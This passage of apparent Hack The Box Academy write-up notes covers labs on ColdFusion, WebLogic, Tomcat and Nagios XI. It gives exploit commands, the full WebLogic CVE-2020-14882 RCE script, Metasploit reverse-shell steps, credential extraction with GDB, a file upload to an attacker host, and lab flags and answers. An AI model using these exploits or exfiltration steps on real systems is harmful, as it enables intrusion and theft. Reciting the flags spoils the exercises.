ColdFusion Server 2.0/3.x/4.x - Administrator Login Password Denial of Service                             | multiple/dos/19996.txt
Macromedia ColdFusion MX 6.0 - Error Message Full Path Disclosure                                          | cfm/webapps/22544.txt
Macromedia ColdFusion MX 6.0 - Oversized Error Message Denial of Service                                   | multiple/dos/24013.txt
Macromedia ColdFusion MX 6.0 - Remote Development Service File Disclosure                                  | multiple/remote/22867.pl
Macromedia ColdFusion MX 6.0 - SQL Error Message Cross-Site Scripting                                      | cfm/webapps/23256.txt
Macromedia ColdFusion MX 6.1 - Template Handling Privilege Escalation                                      | multiple/remote/24654.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------

```

We will try the Directory path traversal vulnerability

```
# We locate it
find / -name "*14641.py" 2>/dev/null

# We copy it to our current working directory
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

python2 14641.py     

# Output: 
usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed

# As we can see, the contents of the password.properties file have been retrieved, proving that this target is vulnerable to CVE-2010-2861:
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"


# Now we will exploit the RCE
searchsploit coldfusion | grep "RCE"

searchsploit -p 50057

cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py . 

nano 50057.py
```

A quick cat review of the code indicates that the script needs some information. Set the correct information and launch the exploit.

```
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

Now execute it

```
python 50057.py

---- 

whoami
```

Results: arctic\tolis


**What is the full .aspx filename that Gobuster identified?**

```
transfer.asp
```


**After bypassing the login, what is the website "Powered by"?**

To bypass loging, enter * both in username and password. 

Results: w3.css


SSH to  with user "root" and password `"!x4;EW[ZLwmDx?=w"` **We placed the source code of the application we just covered at /opt/asset-manager/app.py inside this exercise's target, but we changed the crucial parameter's name. SSH into the target, view the source code and enter the parameter name that needs to be manipulated to log in to the Asset Manager web application.**

This is the source code:

```python
#!/usr/bin/python
import os
import sqlite3
from flask import Flask,request,session,render_template,redirect

app=Flask(__name__)
app.secret_key=os.urandom(24)

@app.route('/')
def index():
	return render_template('index.html')

@app.route('/login',methods=['GET','POST'])
def login():
	if request.method=='GET':
		return render_template('login.html')
	else:
		username=request.form['username']
		password=request.form['password']
		with sqlite3.connect("database.db") as con:
			cur = con.cursor()
			for i,j,k in cur.execute('select * from users where username=? and password=?',(username,password)):
				if k:
					session['user']=i
					return redirect("/home",code=302)
				else:
					return render_template('login.html',value='Account is pending for approval')
		return render_template('login.html',value='Invalid Credentials!!')

@app.route('/home',methods=['GET'])
def home():
	if session:
		return render_template('home.html')
	else:
		return redirect('/',code=302)

@app.route('/logout')
def logout():
	session.clear
	return redirect('/',code=302)

@app.route('/register',methods=['GET','POST'])
def register():
	if request.method=='GET':
		return render_template('index.html')
	else:
		username=request.form['username']
		password=request.form['password']
		try:
			if request.form['active']:
				cond=True
		except:
				cond=False
		with sqlite3.connect("database.db") as con:
			cur = con.cursor()
			cur.execute('select * from users where username=?',(username,))
			if cur.fetchone():
				return render_template('index.html',value='User exists!!')
			else:
				cur.execute('insert into users values(?,?,?)',(username,password,cond))
				con.commit()
				return render_template('index.html',value='Success!!')

@app.route('/profit',methods=['GET','POST'])
def profit():
	if session:
		if request.method=='GET':
			return render_template('profit.html')
		else:
			expr=request.form['sp']
			result=eval(expr)
			return render_template('profit.html',value=result)

	else:
		return redirect('/',code=302)

if __name__=="__main__":
	app.run('0.0.0.0',3000)

```

And these are the two requests intercepted in BurpSuite and modified on the fly. 

Register request:

```
POST /login HTTP/1.1
Host: 10.129.205.15:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.129.205.15:3000
Connection: keep-alive
Referer: http://10.129.205.15:3000/login
Upgrade-Insecure-Requests: 1

username=ninja&password=lolo&active=true
```

Login request:

```
POST /login HTTP/1.1
Host: 10.129.205.15:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Origin: http://10.129.205.15:3000
Connection: keep-alive
Referer: http://10.129.205.15:3000/login
Upgrade-Insecure-Requests: 1

username=ninja&password=lolo&active=true
```

Results: active


**SSH to  with user "htb-student" and password "HTB_@cademy_stdnt!" What credentials were found for the local database instance while debugging the octopus_checker binary?**

We access the server and notice the ./octopus_checker binary. Also PEDA is installed. 
PEDA uses the standard GNU Debugger (GDB) command line, which is used for debugging C and C++ programs.

GDB is a command line tool that lets you step through the code, set breakpoints, and examine and change variables. Running the following command we can execute the binary through it.

```
gdb ./octopus_checker
```

Output:

```shell-session
GNU gdb (Debian 9.2-1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./octopus_checker...
(No debugging symbols found in ./octopus_checker)
```

Once the binary is loaded, we set the disassembly-flavor to define the display style of the code, and we proceed with disassembling the main function of the program.

```assembly
gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main
```

Output:

```assembly
Dump of assembler code for function main:
   0x0000555555555456 <+0>:	endbr64 
   0x000055555555545a <+4>:	push   rbp
   0x000055555555545b <+5>:	mov    rbp,rsp
 
 <SNIP>
 
   0x0000555555555625 <+463>:	call   0x5555555551a0 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
   0x000055555555562a <+468>:	mov    rdx,rax
   0x000055555555562d <+471>:	mov    rax,QWORD PTR [rip+0x299c]        # 0x555555557fd0
   0x0000555555555634 <+478>:	mov    rsi,rax
   0x0000555555555637 <+481>:	mov    rdi,rdx
   0x000055555555563a <+484>:	call   0x5555555551c0 <_ZNSolsEPFRSoS_E@plt>
   0x000055555555563f <+489>:	mov    rbx,QWORD PTR [rbp-0x4a8]
   0x0000555555555646 <+496>:	lea    rax,[rbp-0x4b7]

 <SNIP>
```

Let's say we are interested in the instruction that aparently does the SQL connection:

```assembly
   0x00005555555555ff <+425>:	mov    esi,0x0
   0x0000555555555604 <+430>:	mov    rdi,rax
   0x0000555555555607 <+433>:	call   0x5555555551b0 <SQLDriverConnect@plt>
   0x000055555555560c <+438>:	add    rsp,0x10
   0x0000555555555610 <+442>:	mov    WORD PTR [rbp-0x4b4],ax
```

Or in the HTB exercise it was:

```
   0x0000000000001607 <+433>:	call   0x11b0 <SQLDriverConnect@plt>
```

which (different from the first option) is a **PLT-relative offset**, **not** an absolute virtual memory address like in the first case. This is important when setting a breaking point.

Setting a breaking point in the first case (with the absolute memory location):

```assembly
gdb-peda$ b *0x5555555551b0
```

But for the option 2 we can set the breakpoint on the _function name_, not the address:

```assembly
gdb-peda$ break SQLDriverConnect
```

Now we run it:

```assembly
gdb-peda$ run
```

And the code will stop there in the breakpoint:

```assembly
Starting program: /home/htb-student/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
RAX: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBX: 0x5555555557d0 (<__libc_csu_init>:	endbr64)
RCX: 0xfffffffd 
RDX: 0x7fffffffdf10 ("DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;")
RSI: 0x0 
RDI: 0x55555556c4f0 --> 0x4b5a ('ZK')
RBP: 0x7fffffffe390 --> 0x0 
RSP: 0x7fffffffdeb8 --> 0x55555555560c (<main+438>:	add    rsp,0x10)
RIP: 0x7ffff7d61c20 (<SQLDriverConnect>:	push   r15)
R8 : 0x7fffffffdf70 --> 0x7ffff7d3fec0 --> 0x7ffff7d3f008 --> 0x7ffff7c15c90 (<_ZN10__cxxabiv117__class_type_infoD2Ev>:	endbr64)
R9 : 0x400 
R10: 0xfffffffffffff8ff 
R11: 0x246 
R12: 0x555555555240 (<_start>:	endbr64)
R13: 0x7fffffffe480 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x213 (CARRY parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ffff7d61c15 <__handle_attr_extensions_cs+149>:	pop    rbp
   0x7ffff7d61c16 <__handle_attr_extensions_cs+150>:	ret    
   0x7ffff7d61c17:	nop    WORD PTR [rax+rax*1+0x0]
=> 0x7ffff7d61c20 <SQLDriverConnect>:	push   r15
   0x7ffff7d61c22 <SQLDriverConnect+2>:	push   r14
   0x7ffff7d61c24 <SQLDriverConnect+4>:	mov    r14d,ecx
   0x7ffff7d61c27 <SQLDriverConnect+7>:	push   r13
   0x7ffff7d61c29 <SQLDriverConnect+9>:	mov    r13,r8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdeb8 --> 0x55555555560c (<main+438>:	add    rsp,0x10)
0008| 0x7fffffffdec0 --> 0x7fffffffdeda --> 0xb3b0000000000000 
0016| 0x7fffffffdec8 --> 0x0 
0024| 0x7fffffffded0 --> 0x1 
0032| 0x7fffffffded8 --> 0x0 
0040| 0x7fffffffdee0 --> 0x55555556b3b0 --> 0x4b59 ('YK')
0048| 0x7fffffffdee8 --> 0x55555556c4f0 --> 0x4b5a ('ZK')
0056| 0x7fffffffdef0 --> 0x7fffffffe290 --> 0x7ffff7d4cf74 --> 0x2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, SQLDriverConnect (hdbc=0x55555556c4f0, hwnd=0x0, 
    conn_str_in=0x7fffffffdf10 "DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=SA;PWD=N0tS3cr3t!;", len_conn_str_in=0xfffd, conn_str_out=0x7fffffffdf70 "\300\376\323\367\377\177", conn_str_out_max=0x400, 
    ptr_conn_str_out=0x7fffffffdeda, driver_completion=0x0) at SQLDriverConnect.c:686
686	SQLDriverConnect.c: No such file or directory.
```

Results: SA:N0tS3cr3t!

 Enumerate the target host and identify the running application. What application is running?

```
nmap -sT 10.129.201.102 -Pn
```

Output: 

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-19 18:42 CEST
Nmap scan report for 10.129.201.102
Host is up (0.12s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
7001/tcp open  afs3-callback
```

```
nmap -n -v --script=weblogic-t3-info.nse -Pn 10.129.201.102 -p7001,7002 
```

```
Nmap scan report for 10.129.201.102
Host is up (0.11s latency).

PORT     STATE  SERVICE
7001/tcp open   afs3-callback
|_weblogic-t3-info: T3 protocol in use (WebLogic version: 12.2.1.3)
7002/tcp closed afs3-prserver
```

Then:

```
gobuster dir -u http://10.129.201.102:7001/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .asp .aspx
```


Results: WebLogic


**Enumerate the application for vulnerabilities. Gain remote code execution and submit the contents of the flag.txt file on the administrator desktop.**

After gooogling a little we find that it is vulnerable to: https://www.exploit-db.com/exploits/48971

This is the exploit:

```python
#!/usr/bin/python3

# Exploit Title: Oracle WebLogic Server 10.3.6.0.0 / 12.1.3.0.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0  - Unauthenticated RCE via GET request
# Exploit Author: Nguyen Jang
# CVE: CVE-2020-14882
# Vendor Homepage: https://www.oracle.com/middleware/technologies/weblogic.html
# Software Link: https://www.oracle.com/technetwork/middleware/downloads/index.html

# More Info: https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf

import requests
import sys

from urllib3.exceptions import InsecureRequestWarning

if len(sys.argv) != 3:
    print("[+] WebLogic Unauthenticated RCE via GET request")
    print("[+] Usage : python3 exploit.py http(s)://target:7001 command")
    print("[+] Example1 : python3 exploit.py http(s)://target:7001 \"nslookup your_Domain\"")
    print("[+] Example2 : python3 exploit.py http(s)://target:7001 \"powershell.exe -c Invoke-WebRequest -Uri http://your_listener\"")
    exit()

target = sys.argv[1]
command = sys.argv[2]

request = requests.session()
headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}

print("[+] Sending GET Request ....")

GET_Request = request.get(target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");", verify=False, headers=headers)

print("[+] Done !!")
```

So we run so many payloads and none worked. We finally used metasploit:

```
msfconsole -q

search CVE-2020-14882
use exploit/multi/http/weblogic_admin_handle_rce
set LHOST 10.10.15.8
set RHOSTS 10.129.201.102
run


# And we obtain a meterpreter
shell

# And now, cat the flag:
type C:\Users\Administrator\Desktop\flag.txt
```

Results: w3b_l0gic_RCE!


## Skills Assessments

### Attacking Common Applications - Skills Assessment I

During a penetration test against the company Inlanefreight, you have performed extensive enumeration and found the network to be quite locked down and well-hardened. You come across one host of particular interest that may be your ticket to an initial foothold. Enumerate the target host for potentially vulnerable applications, obtain a foothold, and submit the contents of the flag.txt file to complete this portion of the skills assessment.

**What vulnerable application is running?**

We enumerate the services and ports:

```
nmap 10.129.201.89 -Pn -sC -sV -p- --open
```

We see apache tomcat. After accessing the web we can see that is running under version 9.0.0.M1

Results: Tomcat 


**What port is this application running on?**

Results: 8080


**What version of the application is in use?**

 9.0.0.M1


**Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop.**


```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.201.89:8080/cgi/FUZZ.bat

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.201.89:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

cmd                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 183ms]
:: Progress: [4614/4614] :: Job [1/1] :: 328 req/sec :: Duration: [0:00:18] :: Errors: 0 ::

```


```
http://10.129.201.89:8080/cgi/cmd.bat?&dir+C:\Users\Administrator\Desktop
```


I used metasploit:

```
msfconsole -q
search CVE-2019-0232
use 0
set RHOSTS 10.129.73.151
set LHOST 10.10.14.147
set ForceExploit true
set targeturi /cgi/cmd.bat
run
```

In the meterpreter session now you can type the flag:

```
type c:\Users\Administrator\Desktop\flag.txt
```

Results: f55763d31a8f63ec935abd07aee5d3d0



### Attacking Common Applications - Skills Assessment II

During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the `gitlab.inlanefreight.local` vhost.

vHosts needed for these questions:

- `gitlab.inlanefreight.local`


**What is the URL of the WordPress instance?**

We access the IP and see a website. Within the source code it's linked http://blog.inlanefreight.local

Results: http://blog.inlanefreight.local

**What is the name of the public GitLab project?**

```
# We cannot access gitlab.inlanefreight.local. It's redirected to gitlab.inlanefreight.local:8081 and it does not load. So we scan port 8081 a little bit more:

nmap -p8180 -Pn -sV -sC 10.129.127.10

# Output:
Nmap scan report for blog.inlanefreight.local (10.129.127.10)
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
8180/tcp open  http    nginx
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://blog.inlanefreight.local:8180/users/sign_in
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search 
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/ 
|_/*/new /*/edit /*/raw
|_http-trane-info: Problem with XML parsing of /evox/about



# Now we can access to ttp://blog.inlanefreight.local:8180/users/sign_in and it's the gitlab site we were looking for. We register an user and browse to the existing projects. Then we filter out only public projects
```

Results: Virtualhost

What is the FQDN of the third vhost?

```
 ffuf -w ./vhosts -u http://10.129.127.10 -H "HOST: FUZZ.inlanefreight.local" -fs 46166
```

Output:
```
blog                    [Status: 200, Size: 50114, Words: 16140, Lines: 1015, Duration: 208ms]
ganesh                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 297ms]
gitlab                  [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 126ms]
gestionoffres           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5514ms]
monitoring              [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 495ms]
```

Results: monitoring.inlanefreight.local

**What application is running on this third vhost? (One word)**

```
gobuster dir -u http://inlanefreight.local -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -b 403,404 -x .php,.txt -r 
```

In the output we can read: 

```
/nagios
```

Results: nagios


**What is the admin password to access this application?**

Browsing the code at http://blog.inlanefreight.local:8180/root/nagios-postgresql/-/blob/master/INSTALL we can read this password.

Resutls: `oilaKglm7M09@CPL&^lC`


 Obtain reverse shell access on the target and submit the contents of the flag.txt file.

```
# We know that nagios has several vulnerabilities. 

msfconsole -q

search nagios

use linux/http/nagios_xi_configwizards_authenticated_rce

set LHOST 10.10.15.8
set RHOSTS 10.129.127.10
set PASSWORD oilaKglm7M09@CPL&^lC
run

# And we obtain a shell

# We will find the flag
tree /usr/local/nagiosxi/

# Also with 
find / -name "*flag*.txt" 2>/dev/null 

cat /usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

Results: afe377683dce373ec2bf7eaf1e0107eb


### Attacking Common Applications - Skills Assessment III

During our penetration test our team found a Windows host running on the network and the corresponding credentials for the Administrator. It is required that we connect to the host and find the `hardcoded password` for the MSSQL service.

RDP to  with user "Administrator" and password "xcyj8izxNVzhf4z".  What is the hardcoded password for the database connection in the MultimasterAPI.dll file?

```
xfreerdp /v:10.129.95.200 /u:Administrator /p:xcyj8izxNVzhf4z /cert:ignore


root.txt file with 89edf1a0bcdd83db7cc8d8a2f176a33e
user.txt 4e2923224c44e74eb8ddcb1ae859f3dd



Invoke-FileUpload -Uri http://10.10.15.8:8000/upload -File C:\inetpub\wwwroot\bin\MultimasterAPI.dll


```

![](img/hardcoded.png)

Results: D3veL0pM3nT!